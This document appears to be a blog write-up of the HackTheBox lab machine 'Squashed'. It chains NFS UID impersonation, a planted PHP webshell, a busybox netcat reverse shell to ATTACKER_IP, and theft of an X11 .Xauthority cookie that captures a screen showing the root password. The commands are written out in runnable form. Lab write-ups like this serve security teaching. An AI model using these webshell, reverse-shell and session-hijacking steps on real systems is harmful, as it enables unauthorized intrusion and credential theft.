## Hello everyone!

Today, we will explore *Squashed*, an easy-level machine from **HackTheBox**.

Without further ado, let’s get started!

![image](/HTB/Squashed/Squashed_images/1.png)

(Please ensure that you have added the following line   `TARGET_IP    squashed.htb`   to your local `/etc/hosts` file to enable DNS resolution)





## Information Gathering



First, we will perform an aggressive **Nmap** scan to gather as much information as possible about the target:

![image](/HTB/Squashed/Squashed_images/2.png)

We can identify three exposed services:

SSH (OpenSSH 8.2p1 | 22)

HTTP (Apache 2.4.41 | 80)

NFS (nfs_acl 3 | 2049)

It appears that a **NFS** remote share is accessible. We can list the shared folders using `showmount`:

![image](/HTB/Squashed/Squashed_images/3.png)

We can identify **two shares**: `/home/rose` directory and the `/var/www/html` web directory.

We can access these shares by mounting them to our local system using the `mount` command. We first need to create two different share in our `/tmp` directory as **root**. Once it is done, we will use the following commands to mount up the shares to our local shares in order to access their content:

`mount -t nfs squashed.htb:/home/ross /tmp/share1`

`mount -t nfs squashed.htb:/var/www/html /tmp/share2`

![image](/HTB/Squashed/Squashed_images/4.png)

Inspecting the `/home/ross` directory doesn’t reveal anything interesting and we can’t access the `/var/www/html` directory. We can identify the UID of its owner (www-data) as **2017**:

![image](/HTB/Squashed/Squashed_images/5.png)





## Initial Access



What happens if we attempt to add an user with the same UID on our local machine? Would it allow us to access the `/var/www/html` directory? Let’s verify it by running the following command:

`useradd -u 2017 www_user 2>/dev/null`

`usermod -u 2017 www_user 2>/dev/null`

`su - www_user`

![image](/HTB/Squashed/Squashed_images/6.png)

It works! We impersonated the **www-data** user by owning its **UID**. We now have read and write access on the `/var/www/html` directory, which is very critical. We could deface the website or simply delete it, but most importantly, we can gain physical access on the target by uploading a webshell on it. Since we have write permissions, we can create a `webshell.php` file in the `/var/www/html` directory. The webshell contains the following code:

`<?php system($_GET["cmd"]); ?>`

It allows us to execute arbitrary system commands on the target through a `cmd` GET parameter injected in the URL.

![image](/HTB/Squashed/Squashed_images/7.png)

We can now access the webshell at the following URL: `http://squashed.htb/webshell.php?cmd=COMMAND_HERE`

![image](/HTB/Squashed/Squashed_images/8.png)

The webshell works, we can execute system command as the **alex** user. We can execute the following payload to make spawn a Bash reverse shell that we can catch with a **netcat listener** using the following command:

`busybox nc ATTACKER_IP NC_PORT -e sh`

(ensure that you have set up a listener using `nc -lvnp PORT`)

![image](/HTB/Squashed/Squashed_images/9.png)

After that, the request hangs in the browser, and we successfully obtained initial access on the target machine as the **alex** user. Since the received shell has no job control, we can run the following command to stabilize it in order to execute system commands properly:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

`export TERM=xterm`

The `/home/alex` directory can be accessed to retrieve the first flag:

![image](/HTB/Squashed/Squashed_images/10.png)

## Privilege Escalation

We now need to escalate our current privileges to **root** in order to retrieve the final flag.

It is a good practice to start enumerating privilege escalation vectors by running the `sudo -l` command to list potential command that can be run with **root privileges**. However, here, a password is requiered:

![image](/HTB/Squashed/Squashed_images/11.png)

Inspecting cron jobs, capabilities and SUID doesn’t reveal anything interesting. However, we can identify an **X11 session** in the `/home/ross` directory. The `.Xauthority` file stores cookies used to authenticate X sessions. This can be confirmed by running `w`: 

![image](/HTB/Squashed/Squashed_images/12.png)

We can leverage it with the `xwd` utility. But before, we need to transfer the `.Xauthority` file to our `/home/alex` directory. This can be done by getting back to our mount and impersonate again the **ross** user.We create a local user with the same UID as **ross** to match file ownership on the NFS share:

`useradd -u 1001 ross_user 2>/dev/null`

`usermod -u 1001 ross_user 2>/dev/null` 

Once it is done, we can access the ross_user session running `su - ross_user`:

![image](/HTB/Squashed/Squashed_images/13.png)

We can now copy the file in the `/tmp` directory in order to make it reachable by **alex**. We will then start a Python server to transfer it:

![image](/HTB/Squashed/Squashed_images/14.png)

Once the file has been transferred, we need to provide to the environment variable `XAUTHORITY` the path to the `.Xauthority` file. Since we downloaded it from the /home/alex directory, the command would be the following:

`export XAUTHORITY=/home/alex/.Xauthority`

We can confirm that the X session is reachable by running `xwininfo -root -tree -display :0`:

![image](/HTB/Squashed/Squashed_images/15.png)

We successfully accessed **ross**’s X session. There is a way to capture the screen of the remote session with the -screen option present in the `xwd` utility. Since we can reach the session, we can provide the following command to capture it into an `image` file:

`xwd -root -screen -silent -display :0 > image`

The file needs to be converted in a `.png` format to be accessible. We will transfer it to our local machine in order to use the `convert` utility to achieve this:

![image](/HTB/Squashed/Squashed_images/16.png)

Since the screenshot has been generated through xwd, we need to provide it to `convert`. The following command can be executed to convert the file correctly into a `.jpg` format:

`convert xwd:image image.png`

![image](/HTB/Squashed/Squashed_images/17.png)

The screenshot can then be opened with a tool such as `ristretto`:

![image](/HTB/Squashed/Squashed_images/18.png)

The screenshot displays a `Root` folder containing the `cah$mei7rai9A` password in plaintext for the **root** user!

Getting back to our initial session as the alex `user`, we can run the `su root` command to authenticate as the root user to obtain full access over the target:

![image](/HTB/Squashed/Squashed_images/19.png)

We successfully escalated our privileges, granting root access with full access and control on the target system. We can now navigate to the `/root` directory and retrieve the final flag:

![image](/HTB/Squashed/Squashed_images/20.png)

Challenge completed!

![image](/HTB/Squashed/Squashed_images/21.png)





## Conclusion



This machine demonstrates how seemingly unrelated misconfigurations can be chained together to achieve full system compromise. The initial foothold was obtained by exploiting NFS UID/GID mapping, allowing us to impersonate the **www-data** user and gain write access to the web directory. This led to the deployment of a simple webshell and ultimately a reverse shell as the **alex** user.

From there, privilege escalation was achieved by leveraging a misconfigured X11 session. By abusing the `.Xauthority` file and the `xwd` utility, it was possible to capture the active graphical session of the `ross` user. This revealed sensitive information displayed on the screen, including the root password in plaintext.

Overall, *Squashed* is a great example of how NFS misconfigurations, UID impersonation, and insecure X11 session handling can be combined to fully compromise a Linux system. It highlights the importance of properly isolating network file systems and securing graphical session data in multi-user environments.


**Thank you for reading!**
